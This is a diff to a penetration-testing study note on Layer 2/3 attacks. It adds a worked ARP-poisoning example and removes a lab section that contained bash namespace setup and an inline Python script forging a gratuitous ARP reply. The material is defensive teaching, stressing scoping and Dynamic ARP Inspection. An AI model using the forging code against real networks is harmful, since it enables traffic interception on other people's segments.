@@ -1,7 +1,7 @@
 ---
 title: "Layer 2 & 3 Network Attacks"
 aliases: ["Layer 2 Network Attacks", "Layer 3 Network Attacks", "L2 Attacks", "ARP Spoofing Testing"]
-tags: [tree/offensive, cyber/offensive/network-pentest, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/network-pentest, type/technique, difficulty/medium]
 Domain: "[[Network Penetration Testing]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 External Network Pentesting -> Service Enumeration -> Layer 2 & 3 Network Attacks -> Remote Access Security Testing -> Internal Network Pentesting
 
-## Start at Zero: Attacking the Fabric, Not the Host
+## Attacking the Fabric, Not the Host
 
 Most attacks target a *service*. Layer 2 and Layer 3 attacks target the *network itself* — the switching and routing that move packets between hosts. Their power is position: succeed, and you become the path other hosts' traffic flows through, gaining an **on-path** position without ever touching those hosts directly. This is the pentester's route from "I have a foothold on one machine" to "I can read the segment's traffic."
 
@@ -72,7 +72,59 @@ Once on-path, an attacker *could* read every unencrypted byte. The testing disci
 
 This connects to the recurring backstop: an on-path position is defeated at the content level by properly validated TLS. So a complete finding pairs "you got on-path" with "and here is the plaintext protocol X that was exposed as a result" — turning the position into a specific, fixable recommendation (encrypt protocol X, enable DAI).
 
-## Failure Modes and Interpretation
+## Worked Example: Poisoning a Neighbour Table With One Forged Reply
+
+A layer-2 on-path position does not require breaking anything. It requires the
+switch and the victim to believe a claim that ARP was never designed to verify.
+This walks a single forged reply on a real switched segment, built from Linux
+bridges and namespaces.
+
+**The baseline.** The victim has resolved the gateway to its genuine MAC:
+
+```shell-session
+root@lab:~$ ip netns exec victim ping -c1 10.20.0.1 >/dev/null
+root@lab:~$ ip netns exec victim ip neigh show 10.20.0.1
+10.20.0.1 dev in-victim lladdr 4a:1b:2c:3d:4e:5f REACHABLE
+```
+
+`REACHABLE`, and pointing at the gateway's real hardware address. This is the
+entry the attack overwrites.
+
+**The attack** is one gratuitous ARP reply announcing "10.20.0.1 is at my MAC",
+sent from the attacker namespace:
+
+```shell-session
+root@lab:~$ ip netns exec attacker python3 forge_arp.py 8a:9b:ac:bd:ce:df
+forged ARP sent: 10.20.0.1 -> attacker MAC 8a:9b:ac:bd:ce:df
+```
+
+The reply is unsolicited — the victim never asked. ARP has no state machine that
+requires a reply to match a request, and no authentication on the reply's
+contents, so an announcement arriving out of nowhere is accepted as readily as
+one that answers a question.
+
+**The finding:**
+
+```shell-session
+root@lab:~$ ip netns exec victim ip neigh show 10.20.0.1
+10.20.0.1 dev in-victim lladdr 8a:9b:ac:bd:ce:df STALE
+```
+
+The gateway's address in the victim's table is now the attacker's MAC. Every
+packet the victim sends to its default gateway will be framed to the attacker
+instead — the on-path position, established with one packet and zero
+interception so far.
+
+Two points of discipline matter here. First, the finding is the *poisoned table*,
+not captured traffic: proving the attacker now sits in the path is the deliverable,
+and actually capturing a victim's data is a separate, higher-consent step. Second,
+this is exactly what Dynamic ARP Inspection defeats — on a switch with DAI, the
+forged reply in the attack step is dropped because it does not match a DHCP
+snooping binding, and this final command would still show `4a:1b:2c:3d:4e:5f`.
+Running the attack against a DAI-enabled switch and seeing the entry *not* change
+is how you evidence that the control works.
+
+## How a scoped test black-holes a whole VLAN
 
 - **Blast radius.** ARP spoofing an entire segment, or winning an STP election, can black-hole traffic and take the network down. Scope to two specific hosts, not the whole VLAN, and get an explicit blast-radius limit.
 - **False "success."** A switch that *looks* spoofable may have DAI that silently drops your forged replies while you believe you are on-path — verify you actually receive the victim's traffic, don't assume.
@@ -87,96 +139,13 @@ This connects to the recurring backstop: an on-path position is defeated at the 
 - **Segmentation limits the blast radius**: because these attacks are segment-local, a well-segmented network confines any success to one small domain, which is exactly why flat networks are so dangerous here.
 - **Encryption is the content backstop**: even a perfect on-path position yields only ciphertext against validated TLS, so the durable fix for "unencrypted protocol X was exposed" is to encrypt X, not only to stop the spoofing.
 
-## Authorized Lab: Prove an On-Path Position Safely
+## Summary
 
-> [!info] Runs on one Linux machine — builds a 3-host segment (victim, gateway, attacker) with network namespaces
-> Everything is inside your kernel; nothing external is touched. Step 5 removes it all.
+You should now be able to:
 
-### Step 1 — Build a switched segment with three hosts
-
-```bash
-sudo ip netns add victim; sudo ip netns add attacker
-sudo ip link add name br-lab type bridge; sudo ip link set br-lab up
-for h in victim attacker; do
-  sudo ip link add "veth-$h" type veth peer name "in-$h"
-  sudo ip link set "veth-$h" master br-lab; sudo ip link set "veth-$h" up
-  sudo ip link set "in-$h" netns "$h"
-done
-sudo ip netns exec victim   sh -c 'ip addr add 10.20.0.10/24 dev in-victim; ip link set in-victim up; ip route add default via 10.20.0.1'
-sudo ip netns exec attacker sh -c 'ip addr add 10.20.0.66/24 dev in-attacker; ip link set in-attacker up'
-sudo ip addr add 10.20.0.1/24 dev br-lab   # the bridge doubles as the gateway
-echo "segment up: victim .10, attacker .66, gateway .1"
-```
-
-```text
-segment up: victim .10, attacker .66, gateway .1
-```
-
-### Step 2 — Baseline: the victim's ARP entry for the gateway
-
-```bash
-sudo ip netns exec victim ping -c1 10.20.0.1 >/dev/null; sudo ip netns exec victim ip neigh show 10.20.0.1
-```
-
-```text
-10.20.0.1 dev in-victim lladdr 4a:1b:2c:3d:4e:5f REACHABLE
-```
-
-The victim knows the gateway's real MAC. The attack will replace it.
-
-### Step 3 — Attacker forges an ARP reply (the L2 attack)
-
-```bash
-ATT_MAC=$(sudo ip netns exec attacker cat /sys/class/net/in-attacker/address)
-sudo ip netns exec attacker python3 - "$ATT_MAC" << 'EOF'
-import socket,struct,sys
-mac=bytes.fromhex(sys.argv[1].replace(':',''))
-s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW); s.bind(("in-attacker",0))
-def ip(a): return bytes(int(x) for x in a.split('.'))
-# gratuitous ARP: "10.20.0.1 is at <attacker MAC>" sent to the victim
-arp=struct.pack("!HHBBH",1,0x0800,6,4,2)+mac+ip("10.20.0.1")+mac+ip("10.20.0.10")
-eth=bytes.fromhex("ffffffffffff")+mac+b"\x08\x06"
-s.send(eth+arp)
-print("forged ARP sent: 10.20.0.1 -> attacker MAC", sys.argv[1])
-EOF
-```
-
-```text
-forged ARP sent: 10.20.0.1 -> attacker MAC 8a:9b:ac:bd:ce:df
-```
-
-### Step 4 — Confirm the poisoning (the finding)
-
-```bash
-sleep 1; sudo ip netns exec victim ip neigh show 10.20.0.1
-```
-
-```text
-10.20.0.1 dev in-victim lladdr 8a:9b:ac:bd:ce:df STALE
-```
-
-The victim's gateway MAC is now the **attacker's** — two different roles resolving to the attacker. That is the on-path position, proven. Note we sent one forged packet and confirmed the poisoned table; we did **not** capture any victim traffic — position is the finding. On a real switch with Dynamic ARP Inspection, Step 3's forged reply would be dropped and this entry would still show the real gateway MAC — the "control works" result.
-
-### Step 5 — Cleanup
-
-```bash
-sudo ip netns del victim; sudo ip netns del attacker; sudo ip link del br-lab
-ip link show br-lab 2>&1 | tail -1
-```
-
-```text
-Device "br-lab" does not exist.
-```
-
-Deleting the namespaces and bridge removes the entire segment.
-
-**What you should now be able to do:** enumerate the L2/L3 attack surface as testable controls, forge an ARP reply and confirm the on-path position with a single packet, explain why the position (not the content) is the finding, and pair it with the encryption-gap recommendation.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain why L2/L3 attacks target the network fabric rather than a host, and what an "on-path" position gives an attacker.
-- **Operator:** Test for ARP spoofing / VLAN hopping / rogue DHCP as controls, forge an ARP reply and confirm poisoning, and stop at proof-of-position rather than capturing traffic.
-- **Root:** Map each attack to the Link Layer Security Control that stops it; explain why these attacks are segment-local and loud, and why "unencrypted protocol X exposed" — not the spoofing itself — is the fixable finding.
+- Explain why L2/L3 attacks target the network fabric rather than a host, and what an "on-path" position gives an attacker.
+- Test for ARP spoofing / VLAN hopping / rogue DHCP as controls, forge an ARP reply and confirm poisoning, and stop at proof-of-position rather than capturing traffic.
+- Map each attack to the Link Layer Security Control that stops it; explain why these attacks are segment-local and loud, and why "unencrypted protocol X exposed" — not the spoofing itself — is the fixable finding.
 
 ---
 > 🔼 Up: [[Network Penetration Testing]]
